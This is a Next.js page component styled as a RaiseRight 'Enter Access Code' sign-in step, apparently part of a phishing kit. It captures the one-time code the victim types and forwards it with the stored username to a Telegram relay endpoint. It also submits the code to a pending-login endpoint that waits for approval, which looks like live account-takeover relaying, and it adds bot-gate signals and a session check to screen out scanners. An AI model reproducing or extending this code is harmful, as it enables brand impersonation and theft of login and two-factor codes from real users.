"use client"

import { Suspense, useEffect, useRef, useState, type FormEvent } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { wait } from "@/lib/loading-delays"
import { readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  pendingLoginMethod,
  readStoredDeliveryMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

function parseMethod(raw: string | null): DeliveryMethod {
  if (raw === "email" || raw === "text" || raw === "call") return raw
  return readStoredDeliveryMethod()
}

function EnterCodeContent() {
  const [code, setCode] = useState("")
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const verifyingRef = useRef(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const getBotGateSignals = useBotGateSignals()
  const method = parseMethod(searchParams.get("method"))
  const intro =
    method === "email"
      ? "An email has been sent with an access code. Enter the code to continue."
      : "A code has been sent to your phone. Enter the access code to continue."
  const numericCode = code.replace(/\D/g, "")
  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8
  const secondaryBusy = isResending || resendCooldown > 0

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(
      () => setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1)),
      1000,
    )
    return () => clearInterval(timer)
  }, [resendCooldown])

  const clearOtpAndFocus = (message: string) => {
    setCode("")
    setError(message)
    setIsLoading(false)
    verifyingRef.current = false
  }

  const handleVerify = async (e?: FormEvent) => {
    e?.preventDefault()
    if (isLoading || verifyingRef.current) return
    const otpCode = code.replace(/\D/g, "").slice(0, 8)
    if (otpCode.length < 4) {
      setError("Please enter the complete code")
      return
    }

    verifyingRef.current = true
    setIsLoading(true)
    setError("")

    const typeLabel = verificationTypeLabel(method)

    await fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: readStoredUsername(), code: otpCode,
        verificationType: typeLabel,
        page: "/verify", }),
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || "login"
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "otp",
          userId,
          password: otpCode,
          method: pendingLoginMethod(method),
          maskedEmail,
          maskedPhone,
          flow: "otp",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        clearOtpAndFocus(data.error || MSG_UNABLE_REACH_VERIFICATION)
        return
      }
      if (!data.id) {
        clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)
      if (result === "approved" || result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "timeout") {
        clearOtpAndFocus(MSG_UNABLE_VERIFY_TIME)
        return
      }
      clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
    } catch {
      clearOtpAndFocus(MSG_UNABLE_REACH_VERIFICATION)
    }
  }

  const handleResend = async () => {
    if (secondaryBusy) return
    setIsResending(true)
    setCode("")
    setError("")
    try {
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: readStoredUsername(), page: "/verify" }),
      }).catch(() => {})
      await wait(OTP_RESEND_LOADING_MS)
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
    } finally {
      setIsResending(false)
    }
  }

  const resendLabel = isResending
    ? "Loading..."
    : resendCooldown > 0
      ? `Didn't receive code? Resend in ${resendCooldown}s`
      : "Didn't receive code?"

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="mt-10">
        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
          <h1 className="mb-4 text-center text-5xl font-light tracking-tight text-[#294d73]">
            Enter Access Code
          </h1>
          <p className="mb-10 text-center text-lg text-gray-600">{intro}</p>

          <form onSubmit={handleVerify}>
            <div className="mb-6">
              <div className="bg-gray-50">
                <label
                  htmlFor="verify-code"
                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
                >
                  Access code
                </label>
                <input
                  id="verify-code"
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  value={code}
                  onChange={(e) => {
                    setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                    if (error) setError("")
                  }}
                  maxLength={8}
                  placeholder="Enter code"
                  className="w-full border-0 border-b border-[#28577f] px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
                />
              </div>
              <div className="mt-2 flex justify-end">
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={secondaryBusy}
                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold disabled:opacity-70 disabled:no-underline"
                >
                  {resendLabel}
                </button>
              </div>
            </div>

            {error ? (
              <p className="mb-4 text-red-600 text-base" role="alert">
                {error}
              </p>
            ) : null}

            <button
              type="submit"
              disabled={!isCodeValid || isLoading}
              className="h-16 w-full rounded-full bg-[#1d64a3] text-xl font-semibold text-white transition hover:bg-[#076db7] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? "Signing in..." : "Continue"}
            </button>
          </form>

          <div className="mt-4 text-center">
            <button
              type="button"
              disabled={isLoading}
              onClick={() => router.push("/verify-choice")}
              className="text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f] disabled:opacity-50"
            >
              Cancel
            </button>
          </div>
        </section>
      </main>
    </div>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  )
}
